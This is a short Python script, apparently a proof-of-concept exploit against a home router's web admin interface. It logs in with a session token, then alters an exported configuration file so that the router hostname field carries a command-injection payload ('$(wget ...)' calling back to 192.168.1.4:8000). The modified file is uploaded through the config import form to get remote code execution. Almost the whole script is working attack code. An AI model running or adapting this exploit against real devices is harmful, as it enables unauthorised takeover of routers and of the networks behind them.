import requests, urllib.parse

BASE = "http://192.168.1.1"
import os
PASSWORD = os.environ.get("MR7500_ADMIN_PASSWORD", "")
s = requests.Session(); s.headers["User-Agent"] = "Mozilla/5.0"

r = s.get(BASE + "/model.json", timeout=12)
sec = r.json()["session"]["secToken"]
s.post(BASE + "/Forms/config", data={"token": sec, "err_redirect": "/x", "ok_redirect": "/model.json", "session.password": PASSWORD}, timeout=12)
sec = s.get(BASE + "/model.json", timeout=12).json()["session"]["secToken"]

cfg = open(r"C:\Users\david\AppData\Local\Temp\opencode\export.cfg").read()

payload_raw = "x$(wget -q http://192.168.1.4:8000/rce-hostname -O /dev/null)"
payload_enc = urllib.parse.quote(payload_raw, safe="")
print("[*] payload raw:", payload_raw)
print("[*] payload enc:", payload_enc)

before = "router.hostName=mywebui"
assert before in cfg, "hostName line not found"
cfg = cfg.replace(before, "router.hostName=" + payload_enc)

files = {"config": ("export.cfg", cfg.encode(), "application/octet-stream")}
data = {"token": sec, "ok_redirect": "/index.html?import=success", "err_redirect": "/index.html?import=failed"}
r = s.post(BASE + "/Forms/Import", data=data, files=files, timeout=60, allow_redirects=False)
print("[*] import status:", r.status_code, "->", r.headers.get("Location"))
